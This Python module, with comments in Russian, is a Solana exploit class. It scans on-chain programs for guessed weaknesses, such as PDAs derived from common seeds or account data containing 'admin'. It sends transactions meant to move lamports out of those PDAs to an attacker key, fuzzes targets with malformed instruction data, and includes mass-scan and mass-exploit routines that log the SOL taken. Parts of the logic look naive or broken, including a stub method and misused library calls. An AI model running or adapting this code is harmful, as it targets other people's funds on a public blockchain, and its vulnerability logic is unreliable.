"""
Эксплойты для манипуляций с программами Solana
"""

import asyncio
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass

from solders.pubkey import Pubkey as PublicKey
from solders.keypair import Keypair
from solders.transaction import Transaction
from solders.instruction import Instruction, AccountMeta
from solders.system_program import ID as SYSTEM_PROGRAM_ID

from .base_exploit import BaseExploit, ExploitType, ExploitResult, ExploitStatus

@dataclass
class ProgramVulnerability:
    """Информация об уязвимости программы"""
    program_id: str
    vulnerability_type: str
    severity: str
    exploitable: bool
    details: Dict[str, Any]

class ProgramExploit(BaseExploit):
    """Эксплойты для манипуляций с программами Solana"""
    
    @property
    def exploit_type(self) -> ExploitType:
        return ExploitType.PROGRAM_UPGRADE
    
    async def scan_target(self, target: Union[PublicKey, str]) -> Dict[str, Any]:
        """Сканирование программы на уязвимости"""
        try:
            if isinstance(target, str):
                target = PublicKey(target)
            
            program_info = await self.get_account_info(target)
            if not program_info:
                return {"vulnerable": False, "reason": "Program not found"}
            
            if not program_info["executable"]:
                return {"vulnerable": False, "reason": "Account is not executable"}
            
            vulnerabilities = []
            
            # Проверка 1: Программа без данных (пустая)
            if program_info["data_length"] == 0:
                vulnerabilities.append(ProgramVulnerability(
                    program_id=str(target),
                    vulnerability_type="empty_program",
                    severity="critical",
                    exploitable=True,
                    details={"data_length": 0}
                ))
            
            # Проверка 2: Программа принадлежит System Program (может быть перезаписана)
            if program_info["owner"] == str(SYSTEM_PROGRAM_ID):
                vulnerabilities.append(ProgramVulnerability(
                    program_id=str(target),
                    vulnerability_type="system_owned_program",
                    severity="high",
                    exploitable=True,
                    details={"owner": program_info["owner"]}
                ))
            
            # Проверка 3: Поиск PDA с предсказуемыми seeds
            pda_vulnerabilities = await self._scan_pda_vulnerabilities(target)
            vulnerabilities.extend(pda_vulnerabilities)
            
            # Проверка 4: Анализ инструкций программы
            instruction_vulnerabilities = await self._scan_instruction_vulnerabilities(target)
            vulnerabilities.extend(instruction_vulnerabilities)
            
            return {
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": vulnerabilities,
                "program_info": program_info
            }
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования программы {target}: {e}")
            return {"vulnerable": False, "error": str(e)}
    
    async def prepare_exploit(self, target: Union[PublicKey, str], **kwargs) -> bool:
        """Подготовка эксплойта программы"""
        try:
            scan_result = await self.scan_target(target)
            
            if not scan_result.get("vulnerable", False):
                self.logger.warning("Программа не уязвима")
                return False
            
            # Проверяем баланс для выполнения операций
            if not await self.check_sol_balance(0.1):  # Больше SOL для программных операций
                return False
            
            self.logger.info(f"Найдено уязвимостей программы: {len(scan_result['vulnerabilities'])}")
            return True
            
        except Exception as e:
            self.logger.error(f"Ошибка подготовки эксплойта программы: {e}")
            return False
    
    async def run_exploit(self, target_pubkey: PublicKey) -> ExploitResult:
        self.logger.warning(f"Exploit 'run_exploit' for {self.exploit_type.value} is not implemented.")
        return ExploitResult(
            exploit_type=self.exploit_type,
            status=ExploitStatus.FAILED,
            target_account=str(target_pubkey),
            error_message="Exploit not implemented yet."
        )

    async def execute_exploit(self, target: Union[PublicKey, str], **kwargs) -> ExploitResult:
        """Выполнение эксплойта программы"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            if isinstance(target, str):
                target = PublicKey(target)
            
            scan_result = await self.scan_target(target)
            vulnerabilities = scan_result.get("vulnerabilities", [])
            
            if not vulnerabilities:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_program=str(target),
                    error_message="No program vulnerabilities found"
                )
            
            extracted_value = 0.0
            signatures = []
            
            for vuln in vulnerabilities:
                try:
                    if vuln.vulnerability_type == "empty_program":
                        result = await self._exploit_empty_program(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "system_owned_program":
                        result = await self._exploit_system_owned_program(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "predictable_pda":
                        result = await self._exploit_predictable_pda(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "unsafe_instruction":
                        result = await self._exploit_unsafe_instruction(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                except Exception as e:
                    self.logger.error(f"Ошибка эксплойта программы {vuln.vulnerability_type}: {e}")
                    continue
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            status = ExploitStatus.SUCCESS if extracted_value > 0 else ExploitStatus.FAILED
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=status,
                target_program=str(target),
                transaction_signatures=[str(sig) for sig in signatures],
                extracted_value=extracted_value,
                execution_time=execution_time,
                metadata={
                    "vulnerabilities_exploited": len([v for v in vulnerabilities if v.exploitable]),
                    "total_vulnerabilities": len(vulnerabilities)
                }
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_program=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
    
    async def _scan_pda_vulnerabilities(self, program_id: PublicKey) -> List[ProgramVulnerability]:
        """Сканирование уязвимостей PDA"""
        vulnerabilities = []
        
        try:
            # Общие seeds для поиска PDA
            common_seeds = [
                [b"config"],
                [b"authority"],
                [b"vault"],
                [b"pool"],
                [b"user"],
                [b"admin"],
                [b"metadata"],
                [bytes(self.attacker_pubkey)],
                [b"test"],
                [b"temp"]
            ]
            
            for seeds in common_seeds:
                try:
                    pda, bump = await self.find_program_derived_address(seeds, program_id)
                    
                    # Проверяем существование PDA
                    pda_info = await self.get_account_info(pda)
                    
                    if pda_info and pda_info["lamports"] > 0:
                        vulnerabilities.append(ProgramVulnerability(
                            program_id=str(program_id),
                            vulnerability_type="predictable_pda",
                            severity="medium",
                            exploitable=True,
                            details={
                                "pda": str(pda),
                                "seeds": [s.decode() if isinstance(s, bytes) else str(s) for s in seeds],
                                "bump": bump,
                                "lamports": pda_info["lamports"]
                            }
                        ))
                
                except Exception:
                    continue  # PDA не найден или ошибка
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования PDA: {e}")
        
        return vulnerabilities
    
    async def _scan_instruction_vulnerabilities(self, program_id: PublicKey) -> List[ProgramVulnerability]:
        """Сканирование уязвимостей инструкций"""
        vulnerabilities = []
        
        try:
            # Получаем аккаунты программы для анализа
            response = await self.client.get_program_accounts(program_id)
            
            if len(response.value) > 100:  # Слишком много аккаунтов - подозрительно
                vulnerabilities.append(ProgramVulnerability(
                    program_id=str(program_id),
                    vulnerability_type="excessive_accounts",
                    severity="low",
                    exploitable=False,
                    details={"account_count": len(response.value)}
                ))
            
            # Анализируем первые несколько аккаунтов
            for account_info in response.value[:10]:
                account_data = account_info.account.data
                
                # Поиск паттернов небезопасных инструкций
                if len(account_data) > 0:
                    # Простой анализ данных аккаунта
                    if b"unsafe" in account_data or b"admin" in account_data:
                        vulnerabilities.append(ProgramVulnerability(
                            program_id=str(program_id),
                            vulnerability_type="unsafe_instruction",
                            severity="high",
                            exploitable=True,
                            details={
                                "account": str(account_info.pubkey),
                                "pattern": "unsafe_pattern_detected"
                            }
                        ))
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования инструкций: {e}")
        
        return vulnerabilities
    
    async def _exploit_empty_program(self, target: PublicKey, vuln: ProgramVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт пустой программы"""
        try:
            # Пустая программа может быть перезаписана
            # Создаем простую инструкцию для взаимодействия
            
            transaction = Transaction()
            
            # Создаем инструкцию для вызова пустой программы
            instruction = Instruction(
                program_id=target,
                accounts=[
                    AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                ],
                data=b"\x00"  # Простые данные
            )
            
            transaction.add(instruction)
            
            # Пытаемся выполнить - может привести к ошибке или неожиданному поведению
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info("Успешно взаимодействовали с пустой программой")
                return {
                    "value": 0.0,  # Нет прямого извлечения стоимости
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта пустой программы: {e}")
        
        return None
    
    async def _exploit_system_owned_program(self, target: PublicKey, vuln: ProgramVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт программы, принадлежащей System Program"""
        try:
            # Программы, принадлежащие System Program, могут быть модифицированы
            
            # Получаем информацию о программе
            program_info = await self.get_account_info(target)
            if not program_info:
                return None
            
            # Пытаемся создать новую версию программы
            new_program_keypair = Keypair()
            
            transaction = Transaction()
            
            # Создаем новый аккаунт программы
            from solana.system_program import create_account, CreateAccountParams
            
            create_instruction = create_account(
                CreateAccountParams(
                    from_pubkey=self.attacker_pubkey,
                    new_account_pubkey=new_program_keypair.pubkey(),
                    lamports=program_info["lamports"],
                    space=program_info["data_length"],
                    program_id=target  # Используем целевую программу как владельца
                )
            )
            
            transaction.add(create_instruction)
            transaction.sign(new_program_keypair)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info(f"Создана копия программы: {new_program_keypair.pubkey()}")
                return {
                    "value": 0.0,
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта программы System Program: {e}")
        
        return None
    
    async def _exploit_predictable_pda(self, target: PublicKey, vuln: ProgramVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт предсказуемого PDA"""
        try:
            pda = PublicKey(vuln.details["pda"])
            lamports = vuln.details["lamports"]
            
            # Пытаемся извлечь lamports из PDA
            transaction = Transaction()
            
            # Создаем инструкцию для взаимодействия с PDA
            instruction = Instruction(
                program_id=target,
                accounts=[
                    AccountMeta(pubkey=pda, is_signer=False, is_writable=True),
                    AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                    AccountMeta(pubkey=SYSTEM_PROGRAM_ID, is_signer=False, is_writable=False),
                ],
                data=b"\x01"  # Инструкция для извлечения
            )
            
            transaction.add(instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                extracted_value = lamports / 1e9
                self.logger.info(f"Извлечено {extracted_value:.6f} SOL из PDA")
                return {
                    "value": extracted_value,
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта PDA: {e}")
        
        return None
    
    async def _exploit_unsafe_instruction(self, target: PublicKey, vuln: ProgramVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт небезопасной инструкции"""
        try:
            account = PublicKey(vuln.details["account"])
            
            # Создаем транзакцию для эксплуатации небезопасной инструкции
            transaction = Transaction()
            
            # Различные типы небезопасных инструкций
            unsafe_instructions = [
                b"\x99\x99\x99\x99",  # Переполнение
                b"\xFF" * 32,         # Максимальные значения
                b"\x00" * 100,        # Нулевые данные
                b"admin\x00\x00\x00", # Попытка админских прав
            ]
            
            for unsafe_data in unsafe_instructions:
                try:
                    instruction = Instruction(
                        program_id=target,
                        accounts=[
                            AccountMeta(pubkey=account, is_signer=False, is_writable=True),
                            AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                        ],
                        data=unsafe_data
                    )
                    
                    test_transaction = Transaction()
                    test_transaction.add(instruction)
                    
                    # Симулируем транзакцию
                    cost = await self.estimate_transaction_cost(test_transaction)
                    
                    if cost and cost < 100000:  # Если инструкция выполняется
                        transaction.add(instruction)
                        break
                
                except Exception:
                    continue
            
            if len(transaction.instructions) > 0:
                signature = await self.send_transaction(transaction)
                
                if signature:
                    self.logger.info("Успешно выполнена небезопасная инструкция")
                    return {
                        "value": 0.0,
                        "signatures": [signature]
                    }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта небезопасной инструкции: {e}")
        
        return None
    
    async def scan_programs_by_owner(self, owner: Union[PublicKey, str], 
                                   limit: int = 50) -> List[Dict[str, Any]]:
        """Сканирование программ по владельцу"""
        try:
            if isinstance(owner, str):
                owner = PublicKey(owner)
            
            # Получаем аккаунты по владельцу
            response = await self.client.get_program_accounts(owner)
            
            vulnerable_programs = []
            
            for account_info in response.value[:limit]:
                if account_info.account.executable:
                    program_pubkey = account_info.pubkey
                    
                    # Сканируем программу
                    scan_result = await self.scan_target(program_pubkey)
                    
                    if scan_result.get("vulnerable", False):
                        scan_result["program"] = str(program_pubkey)
                        vulnerable_programs.append(scan_result)
                    
                    # Задержка между сканированиями
                    await asyncio.sleep(0.1)
            
            self.logger.info(f"Найдено {len(vulnerable_programs)} уязвимых программ для владельца {owner}")
            return vulnerable_programs
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования программ по владельцу: {e}")
            return []
    
    async def mass_program_exploit(self, programs: List[Union[PublicKey, str]]) -> List[ExploitResult]:
        """Массовый эксплойт программ"""
        results = []
        
        for program in programs:
            try:
                result = await self.execute_exploit(program)
                results.append(result)
                
                # Логируем результат
                if result.status == ExploitStatus.SUCCESS:
                    self.logger.info(f"Успешно эксплуатирована программа {program}: {result.extracted_value} SOL")
                
                # Задержка между эксплойтами
                await asyncio.sleep(1.0)
                
            except Exception as e:
                self.logger.error(f"Ошибка массового эксплойта программы {program}: {e}")
                
                error_result = ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_program=str(program),
                    error_message=str(e)
                )
                results.append(error_result)
        
        return results
